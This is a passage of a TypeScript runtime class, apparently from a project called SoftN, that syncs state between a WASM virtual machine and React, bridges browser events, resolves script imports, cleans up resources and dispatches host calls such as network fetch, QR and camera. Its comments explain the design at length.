  /** An event on an element of the document, dispatched there: 1 when cancelled, 2 when stopped. */
  dispatchDocumentEvent(id: number, type: string, props: Record<string, unknown>, path: unknown[] = []): number {
    const flags = this.enterForDocument(SHELL_EVENT, [id, type, props, path]);
    return typeof flags === 'number' ? flags : 0;
  }

  /** The page has been drawn: DOMContentLoaded and load, to the code that waits for them. */
  documentReady(): void {
    this.enterForDocument(SHELL_READY, []);
  }

  /**
   * Sync React component state → VM globals.
   * Uses batch API: single WASM boundary crossing for all state variables.
   */
  private syncReactStateToVM(): void {
    if (!this.symbolMap || !this.vmEngine) return;
    this.syncDocumentIn();
    // _vmDirty is set by the worker runtime when state comes back from the worker thread,
    // ensuring the main-thread WASM VM globals stay in sync with worker-reported state.
    const vmDirty = (this.context as unknown as Record<string, unknown>)._vmDirty;
    // null = initial sync (all keys), empty set = nothing dirty
    const dirty = this.dirtyStateKeys;
    if (dirty !== null && dirty.size === 0 && !vmDirty) return;
    // State is changing — invalidate sync function cache so the next calls
    // execute against fresh VM globals instead of returning stale results.
    this.syncCallCache.clear();
    this.computedMayHaveMoved();
    if (dirty === null || vmDirty) {
      // Full sync: first call or worker pushed new state. Watched state is
      // left out: the page's copy of it is the one from when the script
      // loaded, and pushing it would put that back over the live value.
      const watched = this.watchedStateSet;
      const indices: number[] = [];
      const values: unknown[] = [];
      for (let i = 0; i < this.stateVarNames.length; i++) {
        if (watched.has(this.stateVarNames[i])) continue;
        const value = this.context.state[this.stateVarNames[i]];
        // The page's copy of a node of the document is a record standing
        // for it, and never the node: the engine's own is left alone.
        if (this.documentShellOn && holdsShellNode(value)) continue;
        indices.push(this.stateVarIndices[i]);
        values.push(value);
      }
      this.vmEngine.setGlobalsBatch(indices, values);
      // The cached digests describe what the host last READ. They are used to
      // decide whether React still matches the VM, so they stop being an answer
      // to that question the moment anything moves React's copy on its own.
      this.stateVarFingerprints = null;
    } else {
      // Granular sync: only push keys that actually changed — and, as the
      // full sync above does, only keys the host is allowed to own. A VM-owned
      // variable reaches React once, at script load, and is never refreshed;
      // after a permission grant rebuilds the VM that stale copy compares
      // unequal to the fresh one, and pushing it would wipe what _init() had
      // just built (TheOffice lost every character this way).
      const indices: number[] = [];
      const values: unknown[] = [];
      for (const key of dirty) {
        if (this.vmOwnedStateSet.has(key) || this.watchedStateSet.has(key)) continue;
        const sym = this.symbolMap!.get(key);
        if (sym) {
          const value = this.context.state[key];
          if (this.documentShellOn && holdsShellNode(value)) continue;
          indices.push(sym.index);
          values.push(value);
        }
      }
      if (indices.length > 0) {
        this.vmEngine.setGlobalsBatch(indices, values);
        this.forgetFingerprintsFor(dirty);
      }
    }
    this.dirtyStateKeys = new Set();
    if (vmDirty) (this.context as unknown as Record<string, unknown>)._vmDirty = false;
  }

  /**
   * Drop the cached digests for `names`, so the next sync reads them.
   *
   * A digest answers "has the VM changed since I last looked?", but the skip it
   * feeds needs "does React's copy still match the VM?". Those are the same
   * question only while nothing moves React's copy except the read itself.
   *
   * When something else does move it, the two come apart permanently rather
   * than for a frame. Pocket showed it: the files permission is requested at
   * first use, so the first cartridge fails, and granting it rebuilds the VM
   * while React keeps the old instance's state. gbError then took a round trip
   * — "" in the fresh VM, the stale failure pushed back in, "" again once the
   * retry succeeded — and landed on the digest it started from. The VM was
   * right, React was wrong, the digests agreed with each other, and nothing
   * ever read the global again: a loaded, running Game Boy under the words
   * "Could not read that file."
   *
   * NaN rather than deletion: the compare is `!==`, which NaN always satisfies,
   * so an unknown digest reads and the array stays parallel to the name list.
   */
  private forgetFingerprintsFor(names: Iterable<string>): void {
    const fps = this.stateVarFingerprints;
    if (!fps) return;
    for (const name of names) {
      const i = this.stateVarNames.indexOf(name);
      if (i >= 0) fps[i] = Number.NaN;
    }
  }

  /** Digests for the synced globals, or null if this engine has none. */
  private readFingerprints(): number[] | null {
    const engine = this.vmEngine as unknown as {
      getGlobalsFingerprint?: (indices: number[]) => number[] | null;
    };
    if (typeof engine.getGlobalsFingerprint !== 'function') return null;
    try {
      const out = engine.getGlobalsFingerprint(this.stateVarIndices);
      return out && out.length === this.stateVarIndices.length ? out : null;
    } catch {
      // A digest is an optimisation. Losing it must never lose an update.
      return null;
    }
  }

  /**
   * Sync VM globals → React component state.
   * Uses VM-side dirty tracking to only deepEqual globals that were actually
   * written during execution, eliminating O(N) deepEqual scans on unchanged state.
   */
  private syncVMStateToReact(): void {
    if (!this.symbolMap || !this.vmEngine) return;
    this.takeDocumentChanges();

    // Ask the engine which globals moved before reading any of them.
    //
    // Reading a global rebuilds its whole value as JS, so the cost is set by
    // what the globals HOLD. A digest walks the same graph inside the VM and
    // allocates nothing, which is why it is worth one extra boundary crossing
    // to avoid the copies: a 51 KB scene description that has not moved costs
    // microseconds to fingerprint and milliseconds to read.
    //
    // Any doubt reads. A missing digest, a length mismatch, a first call with
    // nothing to compare against, or a NaN cell (the engine reporting "I could
    // not walk this") all fall through to reading everything, which is exactly
    // what this method did before the digests existed.
    let indicesToCheck: number[] = this.stateVarIndices;
    let namesToCheck: string[] = this.stateVarNames;
    let nextFingerprints: number[] | null = null;

    // Watched state is never read (see partitionStateVars). A digest of it
    // that moved draws the page again, and so does any doubt, the same doubt
    // that reads everything else.
    const watched = this.watchedStateSet;
    let watchedMoved = watched.size > 0;

    const fingerprints = this.readFingerprints();
    if (fingerprints) {
      nextFingerprints = fingerprints;
      const previous = this.stateVarFingerprints;
      if (previous && previous.length === fingerprints.length) {
        indicesToCheck = [];
        namesToCheck = [];
        watchedMoved = false;
        for (let i = 0; i < fingerprints.length; i++) {
          // NaN never equals itself, so an "unknown" digest reads. That is the
          // behaviour we want and the reason this is not written as !==.
          if (fingerprints[i] !== previous[i]) {
            if (watched.has(this.stateVarNames[i])) {
              watchedMoved = true;
              continue;
            }
            indicesToCheck.push(this.stateVarIndices[i]);
            namesToCheck.push(this.stateVarNames[i]);
          }
        }
        if (indicesToCheck.length === 0 && !FINGERPRINT_AUDIT()) {
          this.stateVarFingerprints = nextFingerprints;
          if (watchedMoved) this.context.redraw?.();
          return;
        }
      }
    }

    // The audit reads everything anyway and reports any global the digests
    // called unchanged that the value comparison disagrees with. Off by
    // default; the whole design rests on those two never disagreeing, so it
    // exists to be run against real bundles rather than argued about.
    const auditing = FINGERPRINT_AUDIT() && nextFingerprints !== null;
    const skipped = auditing ? new Set(indicesToCheck) : null;
    if (auditing) {
      indicesToCheck = this.stateVarIndices;
      namesToCheck = this.stateVarNames;
    }
    if (watched.size > 0 && namesToCheck === this.stateVarNames) {
      indicesToCheck = this.stateVarIndices.filter((_, i) => !watched.has(this.stateVarNames[i]));
      namesToCheck = this.stateVarNames.filter((name) => !watched.has(name));
    }

    const allValues = this.vmEngine.getGlobalsBatch(indicesToCheck) as unknown[];
    const changes: Record<string, unknown> = {};
    for (let i = 0; i < namesToCheck.length; i++) {
      const name = namesToCheck[i];
      const newVal = allValues[i];
      const oldVal = this.context.state[name];
      if (!deepEqual(newVal, oldVal)) {
        this.context.state[name] = newVal;
        changes[name] = newVal;
      }
    }

    if (auditing && skipped) {
      for (let i = 0; i < namesToCheck.length; i++) {
        const name = namesToCheck[i];
        const wasSkipped = !skipped.has(indicesToCheck[i]);
        if (wasSkipped && name in changes) {
          console.error(
            '[SoftN] FINGERPRINT MISS: ' + name + ' was reported unchanged but its value moved'
          );
        }
      }
    }
    if (nextFingerprints) this.stateVarFingerprints = nextFingerprints;

    const changedKeys = Object.keys(changes);
    this._perfChangedVars += changedKeys.length;
    if (changedKeys.length === 0) {
      if (watchedMoved) this.context.redraw?.();
      return;
    }
    // Use batch setter if available (single React setState call for all changes)
    if (this.context.batchSetState) {
      this.context.batchSetState(changes);
    } else {
      // Fallback: individual setState calls
      for (const name of changedKeys) {
        this.context.setState(name, changes[name]);
      }
    }
  }

  /**
   * Evaluate one `$:` declaration by calling the function compiled for it.
   *
   * The same work as {@link evaluateExpression}, minus the per-call parse — and
   * these run on every render, which is where that parse would have been paid.
   */
  private callComputed(fnName: string, declName: string): unknown {
    try {
      if (!this.vmEngine) return undefined;
      // Skip React→VM sync if an async function is in-flight
      if (!this.asyncCallInProgress) {
        this.syncReactStateToVM();
      }
      this.syncExternalFunctionsToVM();
      this.settleComputedIfStale();
      return this.vmEngine.callFunctionSync(fnName, []);
    } catch (error) {
      console.error(`[SoftN] Error evaluating computed "${declName}":`, error);
      return undefined;
    }
  }

  /**
   * Work every top-level `$:` value out again inside the VM and assign it,
   * so that guest code reading one — another `$:`, a function — reads what
   * its expression is worth now. Answers the values, in the order of
   * `computedSettle.names`, when they are wanted.
   *
   * One pass does it for a script whose `$:` expressions name what they
   * read: the generated function goes through them in that order. A script
   * where one reads another through a function is passed over again until a
   * pass changes nothing, within a bound, so that a pair that will never
   * stop changing costs a fixed amount and is said once.
   */
  private settleComputed(wanted: boolean): unknown[] | null {
    const plan = this.computedSettle;
    if (!plan || !this.vmEngine) return null;

    const compare = plan.untilStill;
    let values: unknown[] | null = null;
    for (let pass = 1; ; pass++) {
      const [next, failures] = this.vmEngine.callFunctionSync(COMPUTED_SETTLE_FUNCTION, [wanted || compare]) as [
        unknown[] | null,
        Array<[number, string]>,
      ];
      const still = !compare || (values !== null && deepEqual(values, next));
      values = next;
      if (still || pass === COMPUTED_SETTLE_PASSES) {
        this.sayComputedFailures(plan.names, failures);
        if (!still && !this.computedUnsettledSaid) {
          this.computedUnsettledSaid = true;
          console.error(
            `[SoftN] The $: values were still changing after being worked out ${COMPUTED_SETTLE_PASSES} times, and are left as they stood. One of them reads another through a function, and each time round gives a different answer.`
          );
        }
        break;
      }
    }
    this.computedStale = false;
    // A helper asked from the page may have answered from the values as they
    // were; its answer must not outlive them.
    this.syncCallCache.clear();
    return values;
  }

  /** Say why a `$:` value could not be worked out, when the reason is new. */
  private sayComputedFailures(names: readonly string[], failures: ReadonlyArray<[number, string]>): void {
    const failed = new Map(failures.map(([index, reason]) => [names[index], reason]));
    for (const name of names) {
      const reason = failed.get(name);
      if (reason === undefined) {
        this.computedFailures.delete(name);
      } else if (this.computedFailures.get(name) !== reason) {
        this.computedFailures.set(name, reason);
        console.error(`[SoftN] Error evaluating computed "${name}":`, reason);
      }
    }
  }

  /** Bring the `$:` globals up to date before guest code that may read them runs. */
  private settleComputedIfStale(): void {
    if (!this.computedSettle || !this.computedStale) return;
    try {
      this.settleComputed(false);
    } catch (error) {
      console.error('[SoftN] Error working out the $: values:', error);
    }
  }

  /** Something the `$:` values are worked out from may have changed. */
  private computedMayHaveMoved(): void {
    if (!this.computedSettle) return;
    this.computedStale = true;
    this.computedBatch = null;
  }

  /**
   * A top-level `$:` value, as a page reads it.
   *
   * A draw reads every value one after another, with nothing between. The
   * first read works them all out — the same pass that assigns the globals
   * logic reads, so the page and the logic cannot disagree — and the rest of
   * that draw is answered from it. The answers are dropped as soon as the
   * draw is over, so the next one works them out again whatever changed in
   * between: a record written by another tab moves nothing this runtime
   * could have noticed.
   */
  private readSettledComputed(name: string): unknown {
    try {
      if (!this.vmEngine || !this.computedSettle) return undefined;
      if (!this.computedBatch) {
        // Skip React→VM sync if an async function is in-flight
        if (!this.asyncCallInProgress) {
          this.syncReactStateToVM();
        }
        this.syncExternalFunctionsToVM();
        const values = this.settleComputed(true) ?? [];
        const batch = new Map<string, unknown>();
        this.computedSettle.names.forEach((settled, index) => batch.set(settled, values[index]));
        this.computedBatch = batch;
        queueMicrotask(() => {
          if (this.computedBatch === batch) this.computedBatch = null;
        });
      }
      return this.computedBatch.get(name);
    } catch (error) {
      console.error(`[SoftN] Error evaluating computed "${name}":`, error);
      return undefined;
    }
  }

  /**
   * Evaluate an expression synchronously using the VM.
   */
  evaluateExpression(expression: string): unknown {
    try {
      if (!this.vmEngine) return undefined;

      // Skip React→VM sync if an async function is in-flight
      if (!this.asyncCallInProgress) {
        this.syncReactStateToVM();
      }
      this.syncExternalFunctionsToVM();
      // WASM returns plain JS values — no conversion needed
      return this.vmEngine.evalSync(expression);
    } catch (error) {
      console.error(`[SoftN] Error evaluating expression "${expression}":`, error);
      return undefined;
    }
  }

  /**
   * Update the context with new state (called by SoftNRenderer when React state changes)
   */
  updateContext(newState: Partial<RuntimeState>): void {
    // Track which specific keys changed (e.g., from :bind input updates).
    // After syncVMStateToReact(), context.state and React componentState have
    // the same object references, so !== correctly detects external changes.
    for (const key of Object.keys(newState)) {
      if (
        (newState as Record<string, unknown>)[key] !==
        (this.context.state as Record<string, unknown>)[key]
      ) {
        if (!this.dirtyStateKeys) this.dirtyStateKeys = new Set();
        this.dirtyStateKeys.add(key);
        // The page's state moved: values handed out for a draw are over.
        this.computedBatch = null;
      }
    }
    Object.assign(this.context.state, newState);
  }

  /**
   * Discover and bridge VM event listeners to real browser event listeners.
   * Called after every async VM function call so listeners registered in _init()
   * or any other function are automatically bridged.
   *
   * The mapping is fully dynamic — the runtime does not hardcode any key bindings.
   * The .logic code registers handlers (e.g. window.addEventListener("keydown", fn)),
   * and this method bridges those to real browser events.
   */
  private bridgeEventListeners(): void {
    if (!this.vmEngine || typeof window === 'undefined') return;

    const types = this.vmEngine.getEventListenerTypes();
    for (const eventType of types) {
      if (this.bridgedEventTypes.has(eventType)) continue;
      this.bridgedEventTypes.add(eventType);

      // Pointer movement, scrolling, resizing and the wheel arrive several
      // times a frame; they cross the bridge at most once a frame, combined
      // by a policy the event type chooses — see event-coalescer.ts. Ordering
      // is preserved: nothing is delivered ahead of a sample already waiting.
      const policy = coalescePolicyFor(eventType);
      const isThrottled = policy !== null;

      const dispatch = (eventObj: Record<string, unknown>) => {
        if (!this.vmEngine) return;

        // Sync React state → VM before dispatch
        this.syncReactStateToVM();
        // Skip window sync for throttled events — mouse/scroll handlers
        // rarely need window properties, and this saves ~2 WASM crossings/frame.
        if (!isThrottled) {
          this.syncWindowToVM();
        }

        // Dispatch to VM handlers (runs synchronously in WASM)
        this.settleComputedIfStale();
        try {
          this.vmEngine.dispatchEvent(eventType, eventObj);
        } catch (error) {
          // Said as a handler's failure is, and the app goes on, with what
          // the listener changed before it threw. It used to leave the
          // browser's own listener as an uncaught error that named no part of
          // the app, and skip the drawing below.
          console.error(`[SoftN] Error in a ${eventType} listener the logic put on the window:`, error);
        }
        this.computedMayHaveMoved();
        // And what a function answered the page from. An answer is kept for
        // the rest of a drawing, and let go by a call of the script's or by
        // two milliseconds passing; a listener is neither, so a page drawn
        // again straight after a key was answered from before the key.
        this.syncCallCache.clear();

        // Sync VM state → React after dispatch
        this.syncVMStateToReact();
        if (!isThrottled) {
          this.syncWindowFromVM();
          // Discover new __ window properties set by the handler.
          // Deferred for throttled events since they rarely add new sync keys.
          this.discoverWindowSyncKeys();
        }

        // A handler that called `softn.*` queued a host call the engine is
        // holding until someone drains it. `callFunction` drains after every
        // call and the worker runtime drains after every dispatch, but this
        // path drained nothing, so a `softn.audio.play` from a keydown
        // handler sat in the queue until the next function call happened to
        // release it. Not awaited: the handler has returned and the browser
        // event is over; the calls resolve into the VM as they complete.
        const pending = this.vmEngine.drainPendingHostCalls();
        if (pending.length > 0) void this.processPendingHostCallsUnlocked(pending);
      };

      let listener: (event: Event) => void;
      if (policy !== null) {
        const coalescer = new EventCoalescer(policy, dispatch);
        this.eventCoalescers.push(coalescer);
        listener = (event: Event) => {
          if (!this.vmEngine || !appHears(this, event)) return;
          coalescer.push(extractEventProps(event));
        };
      } else {
        listener = (event: Event) => {
          // Only what is aimed at this app: see key-capture.ts.
          if (!this.vmEngine || !appHears(this, event)) return;
          // A key the script asked to keep whole: the browser's default is
          // cancelled here, since the handler runs too late to do it.
          if (shouldCaptureKey(event, this)) event.preventDefault();
          dispatch(extractEventProps(event));
        };
      }

      window.addEventListener(eventType, listener);
      if (!this.nativeListeners.has(eventType)) {
        this.nativeListeners.set(eventType, []);
      }
      this.nativeListeners.get(eventType)!.push(listener);
    }
  }

  /**
   * Discover __ prefixed properties on the VM's window object and register
   * them as sync keys. This makes window property sync fully dynamic — the
   * .logic code sets any window.__xxx property and it gets synced automatically.
   */
  private discoverWindowSyncKeys(): void {
    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;

    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
    if (!vmWindow || typeof vmWindow !== 'object') return;

    for (const key of Object.keys(vmWindow as Record<string, unknown>)) {
      if (key.startsWith('__') && !this.syncKeys.has(key)) {
        this.syncKeys.add(key);
        this.windowSyncActive = true;
      }
    }
  }

  /**
   * Clean up resources (event listeners, WASM engine, etc.)
   */
  cleanup(): void {
    this.sandboxHost?.dispose();
    this.sandboxHost=null;
    // Set before anything else: an in-flight `loadScript` checks this after
    // each of its awaits, so a cleanup that lands mid-load stops the script
    // from being executed into an engine nobody will ever dispose.
    this.disposed = true;

    // Clean up native event listeners
    if (typeof window !== 'undefined') {
      for (const [eventName, listeners] of this.nativeListeners.entries()) {
        for (const listener of listeners) {
          window.removeEventListener(eventName, listener);
        }
      }
    }
    this.nativeListeners.clear();
    this.bridgedEventTypes.clear();
    // A frame already requested must not fire into a disposed engine, and
    // neither may a timer the script set.
    for (const coalescer of this.eventCoalescers) coalescer.dispose();
    this.eventCoalescers = [];
    this.timers.dispose();
    this.dueTimers = [];
    if (this.loadEntry !== null) {
      clearTimeout(this.loadEntry);
      this.loadEntry = null;
    }
    clearCapturedKeys(this);
    setAppElement(this, null);
    this.syncCallCache.clear();
    this.externalFunctionNames = [];
    this.externalFunctionValues = [];
    this.externalValuesGlobalIndex = -1;
    this.syncKeys.clear();
    this.windowSyncSeen.clear();
    this.windowSyncActive = false;
    // The app's latches go with the app. Left behind, the next runtime on
    // this page — a reload of the same bundle — would snapshot them as the
    // host's and refuse to write them, and pointer lock would never engage.
    if (typeof window !== 'undefined') {
      const realWin = window as unknown as Record<string, unknown>;
      for (const key of this.windowKeysWritten) {
        if (this.hostWindowKeys.has(key)) continue;
        try {
          delete realWin[key];
        } catch {
          // A non-configurable property is not this runtime's to remove.
        }
      }
    }
    this.windowKeysWritten.clear();

    // Silence. A looping track has no reason to stop on its own, so closing
    // the tab on an app playing music would otherwise leave it playing for
    // the rest of the session with nothing on screen to stop it.
    this.stopAllAudio();
    this.localSpeech?.dispose();
    this.localSpeech = null;

    // And stop listening. A microphone left open outlives the app that opened
    // it: the tracks stay live, the OS recording indicator stays lit, and
    // nothing on screen explains why.
    this.stopMicrophone();

    // Image decoding has no native AbortSignal. Explicitly settle any pending
    // load so a malformed image cannot keep an orphaned host call alive.
    for (const cancel of this.qrDecodeCancelers) cancel();
    this.qrDecodeCancelers.clear();

    // An app that has been closed no longer owns background network work.
    // Abort pending fetches so they cannot continue downloading into an
    // orphaned host-call continuation.
    for (const controller of this.netAbortControllers) controller.abort();
    this.netAbortControllers.clear();

    // Release AI resources: each loaded model's Worker is terminated.
    this.modelHost?.dispose();
    this.modelHost = null;
    if (this.gpuComputeManager) {
      this.gpuComputeManager.releaseAll().catch(() => {});
      this.gpuComputeManager = null;
    }

    // Dispose WASM engine
    if (this.vmEngine) {
      this.vmEngine.dispose();
      this.vmEngine = null;
    }
  }

  // ========================================================================
  // Import resolution
  // ========================================================================

  /**
   * Resolve import statements in .logic code by inlining imported files.
   * Handles `import "./path.logic"` statements by fetching the imported code
   * via the importResolver and recursively resolving nested imports.
   */
  private async resolveImports(
    code: string,
    expanding: Set<string>,
    currentPath?: string
  ): Promise<string> {
    if (!this.importResolver) return code;

    // Match import statements: import "./path.logic" or import './path.logic'
    const importRegex = /^\s*import\s+["']([^"']+)["']\s*;?\s*$/gm;
    const parts: string[] = [];
    let lastIndex = 0;
    let match;

    while ((match = importRegex.exec(code)) !== null) {
      // Add code before this import
      parts.push(code.slice(lastIndex, match.index));

      const importPath = match[1];
      const resolvedPath = this.resolveImportPath(importPath, currentPath);

      // A file already in this compilation is included once, not twice: the
      // result is a single translation unit, and re-inlining a file would
      // redeclare every class and variable in it — a SyntaxError to the VM.
      // Two files importing a common third is normal, so this is a skip.
      if (this.includedLogicPaths.has(resolvedPath)) {
        parts.push(`/* already included: ${importPath} */`);
      } else if (expanding.has(resolvedPath)) {
        // Still being expanded further up the chain, so it genuinely cycles.
        throw new Error(
          `Circular import detected: "${resolvedPath}" is already in the import chain: ${[...expanding].join(' → ')} → ${resolvedPath}`
        );
      } else {
        expanding.add(resolvedPath);
        this.includedLogicPaths.add(resolvedPath);
        try {
          const source = await this.importResolver(resolvedPath);
          if (source != null) {
            // Recursively resolve imports in the imported code
            const resolved = await this.resolveImports(moduleSyntaxAsScript(source), expanding, resolvedPath);
            parts.push(resolved);
          } else {
            parts.push(`/* import not found: ${importPath} */`);
          }
        } catch (e) {
          console.error(`[SoftN] Error resolving import "${importPath}":`, e);
          parts.push(`/* import error: ${importPath} */`);
        } finally {
          // Off the ancestor chain — it stays in includedLogicPaths, so a
          // later sibling import of the same file skips rather than throws.
          expanding.delete(resolvedPath);
        }
      }

      lastIndex = match.index + match[0].length;
    }

    // Add remaining code after last import
    parts.push(code.slice(lastIndex));
    return parts.join('\n');
  }

  /**
   * Resolve a relative import path against the current file's directory.
   */
  private resolveImportPath(importPath: string, currentPath?: string): string {
    // Absolute paths, URLs — return as-is
    if (
      importPath.startsWith('http://') ||
      importPath.startsWith('https://') ||
      importPath.startsWith('/')
    ) {
      return importPath;
    }
    // Not relative — return as-is
    if (!importPath.startsWith('./') && !importPath.startsWith('../')) {
      return importPath;
    }
    // No base path — return as-is
    if (!currentPath) {
      return importPath;
    }
    // Resolve relative to current file's directory
    const baseParts = currentPath.split('/');
    baseParts.pop(); // remove filename to get directory
    const importParts = importPath.split('/');
    for (const part of importParts) {
      if (part === '.') continue;
      if (part === '..') {
        baseParts.pop();
      } else {
        baseParts.push(part);
      }
    }
    return baseParts.join('/');
  }

  // ========================================================================
  // Window/Navigator sync (simplified for WASM)
  // ========================================================================

  /**
   * Register a __ window property key for syncing from real window → VM.
   */
  registerSyncKey(key: string): void {
    if (key.startsWith('__')) {
      this.syncKeys.add(key);
    }
  }

  /** What each synced window global held when it was last handed to the VM. */
  private windowSyncSeen = new Map<string, unknown>();

  /**
   * Sync properties from the real browser `window` into the VM's `window` global.
   * Only syncs __ prefixed keys registered via registerSyncKey().
   * Short-circuits when no sync keys have values on the real window.
   */
  private syncWindowToVM(): void {
    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;
    if (typeof window === 'undefined' || this.syncKeys.size === 0) return;

    // Quick check: are any syncKeys actually set on the real window?
    const realWin = window as unknown as Record<string, unknown>;
    if (!this.windowSyncActive) {
      // Periodically recheck (cheap: just test 2 keys)
      for (const key of this.syncKeys) {
        if (realWin[key] !== undefined) {
          this.windowSyncActive = true;
          break;
        }
      }
      if (!this.windowSyncActive) return;
    }

    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
    if (!vmWindow || typeof vmWindow !== 'object') return;

    const updated: Record<string, unknown> = { ...(vmWindow as Record<string, unknown>) };
    let changed = false;

    for (const key of this.syncKeys) {
      const value = realWin[key];
      if (value !== undefined && typeof value !== 'function') {
        updated[key] = value;
        // Remembered so the write-back can tell a value the script changed
        // from one it merely received.
        this.windowSyncSeen.set(key, value);
        changed = true;
      }
    }

    if (changed) {
      this.vmEngine.setGlobal(this.windowGlobalIndex, updated);
    }
  }

  /**
   * Sync properties from the VM's `window` global back to the real browser `window`.
   * Only syncs keys registered via registerSyncKey().
   */
  private syncWindowFromVM(): void {
    if (!this.windowSyncActive) return;
    if (this.windowGlobalIndex < 0 || !this.vmEngine) return;
    if (typeof window === 'undefined' || this.syncKeys.size === 0) return;

    const vmWindow = this.vmEngine.getGlobal(this.windowGlobalIndex);
    if (!vmWindow || typeof vmWindow !== 'object') return;

    const realWin = window as unknown as Record<string, unknown>;
    const vmWinObj = vmWindow as Record<string, unknown>;

    for (const key of this.syncKeys) {
      const value = vmWinObj[key];
      if (value === undefined) continue;
      // The host's own globals are read-only from in here — see hostWindowKeys.
      // A function is the host's as well whatever its name: the VM never
      // receives one (syncWindowToVM skips them), so it cannot be handing one
      // back, only replacing it.
      if (this.hostWindowKeys.has(key) || typeof realWin[key] === 'function') continue;
      // Nor names the host, its frameworks or SoftN itself may give a value
      // later: `__TAURI__` written from here made every app opened after it
      // take the page for the desktop runtime, and fail to open its storage.
      if (HOST_WINDOW_NAME.test(key)) continue;
      // A value the script did not touch is not written back. The browser
      // may have moved it since the call began — a pointer-locked camera
      // writes __scene3dYaw on every mouse move — and echoing the copy the
      // VM was handed would throw that movement away.
      if (this.windowSyncSeen.has(key) && Object.is(this.windowSyncSeen.get(key), value)) continue;
      realWin[key] = value;
      this.windowKeysWritten.add(key);
      this.windowSyncSeen.set(key, value);
    }
  }

  // ── Host call processing (softn.* bridge) ───────────────────────────

  /** Max total host calls resolved per processPendingHostCalls invocation.
   *  Prevents runaway callback chains from consuming unbounded memory/CPU. */
  private static readonly MAX_HOST_CALL_ROUNDS = 256;

  /**
   * Process pending host calls WITHOUT holding the VM lock during async operations.
   * The lock is released before this method is called, so other VM calls (like
   * movement ticks) can execute while slow host operations (AI generation) run.
   * The lock is re-acquired only briefly to resolve each callback in the VM.
   */
  private async processPendingHostCallsUnlocked(initialPending: PendingHostCall[]): Promise<void> {
    if (!this.vmEngine) return;

    // Timers keep their own clock and are not run one after another with the
    // rest: see LogicTimers.
    let pending = this.timers.take(initialPending);
    let totalResolved = 0;
    while (pending.length > 0) {
      for (const call of pending) {
        if (++totalResolved > SoftNScriptRuntime.MAX_HOST_CALL_ROUNDS) {
          console.error(
            `[SoftN] Host call limit exceeded (${SoftNScriptRuntime.MAX_HOST_CALL_ROUNDS}) — ` +
              'aborting to prevent runaway callback chains'
          );
          return;
        }
        // Execute the async host call OUTSIDE the lock
        let result: unknown;
        try {
          result = await this.executeHostCall(call);
        } catch (err) {
          result = { error: String(err) };
          // The callback gets `{error}`, and almost no bundle checks for it —
          // so a refused call is a call that quietly does nothing. That was
          // tolerable while consent gated the load and a running app was always
          // a fully granted one; with the consent bar an app can be asked for
          // work it is not allowed to do yet, and "nothing happened" is the one
          // outcome that reads as broken rather than as withheld.
          // "failed", not "refused": this catch is around the whole
          // executeHostCall switch, so a fetch timeout, a malformed argument
          // and a denied capability all arrive here. The line said "refused"
          // for every one of them, and the word was the entire content of it.
          //
          // The console is as far as this goes today, and that is a gap, not a
          // conclusion: a user who presses DeviceKit's Fetch button while the
          // bar is unanswered sees the button do nothing at all. The runtime
          // cannot answer it inside the app — it does not know where in a
          // bundle's layout a message belongs, and putting one there would be
          // inventing UI the bundle did not ask for. It could answer it on the
          // permission bar, which is the runtime's own surface and already on
          // screen; that needs a refusal callback threaded from here through
          // SoftNRenderer to the bar, and it is not built.
          console.warn(`[SoftN] ${call.kind} failed: ${String(err)}`);
        }

        // The engine may have been disposed while the host call was in flight.
        //
        // The guard at the top of this method ran before that await, and the
        // non-null assertions below are only true of the engine that was alive
        // then. A `softn.net.fetch` from a click handler, followed by an
        // unmount before it resolves, hit `drainPendingHostCalls()` on null in
        // a try/finally with no catch — an uncaught TypeError propagating out
        // through `createVMFunction`, which callers invoke without `.catch`.
        if (!this.vmEngine) return;

        // Re-acquire the lock to resolve the callback in the VM
        await this.vmCallLock;
        if (!this.vmEngine) return;
        let release: (() => void) | undefined;
        this.vmCallLock = new Promise<void>((r) => {
          release = r;
        });

        try {
          this.syncCallCache.clear();
          this.syncReactStateToVM();
          this.settleComputedIfStale();
          this.vmEngine!.resolveHostCallback(call.id, result);
          this.computedMayHaveMoved();
          this.syncVMStateToReact();
        } catch (err) {
          console.error(`[SoftN] Error resolving host callback:`, err);
        } finally {
          release!();
        }
      }

      // Check for newly queued host calls (callback may have queued more)
      // Need the lock briefly to drain
      await this.vmCallLock;
      if (!this.vmEngine) return;
      let release2: (() => void) | undefined;
      this.vmCallLock = new Promise<void>((r) => {
        release2 = r;
      });
      try {
        pending = this.timers.take(this.vmEngine.drainPendingHostCalls());
      } finally {
        release2!();
      }
    }
  }

  /**
   * Run one `host.call` on behalf of a script hosted elsewhere — the Web
   * Worker runtime's. The handlers need this thread (files, camera, mic,
   * audio, the network and its permission checks) and nothing of a VM, so an
   * instance that never loads a script serves them as they are.
   */
  executeHostCallExternal(call: PendingHostCall): Promise<unknown> {
    return this.executeHostCall(call);
  }

  /** The element the app is drawn in (see key-capture.ts `appHears`). */
  setAppRoot(element: Element | null): void {
    setAppElement(this, element);
  }

  private async executeHostCall(call: PendingHostCall): Promise<unknown> {
    switch (call.kind) {
      case 'backend.call': {
        if (!this.backendCall) return { error: 'This app has no connected backend.' };
        const [action, raw] = call.args;
        if (!/^[a-z][a-zA-Z0-9_-]{0,63}$/.test(action) || (raw?.length ?? 0) > 32768) {
          return { error: 'Invalid backend request.' };
        }
        try {
          const input: unknown = JSON.parse(raw || '{}');
          if (!input || typeof input !== 'object' || Array.isArray(input)) return { error: 'Backend input must be an object.' };
          return await this.backendCall(action, input as Record<string, unknown>);
        } catch (error) {
          return { error: error instanceof Error ? error.message : 'Backend request failed.' };
        }
      }
      case 'net.fetch': {
        // A host that supplied a handler has taken this capability over: the
        // request is its to make or refuse, and the permission check and host
        // allowlist in `handleNetFetch` belong to the browser `fetch` the
        // handler is standing in for. The script's options object is parsed
        // here rather than passed on as text so the handler sees what the
        // browser path sees.
        if (!this.netFetchHandler) return this.handleNetFetch(call);
        const [url, optionsJson] = call.args;
        let options: Record<string, unknown> = {};
        try {
          options = optionsJson ? JSON.parse(optionsJson) : {};
        } catch {
          return { error: 'The request options are not JSON.' };
        }
        return this.netFetchHandler(url, options);
      }
      case 'qr.encode':
        return this.handleQrEncode(call);
      case 'qr.decode':
        return this.handleQrDecode(call);
      case 'camera.capturePhoto':
        return this.handleCameraCapture(call);
      case 'camera.recordVideo':
        return this.handleCameraRecord(call);
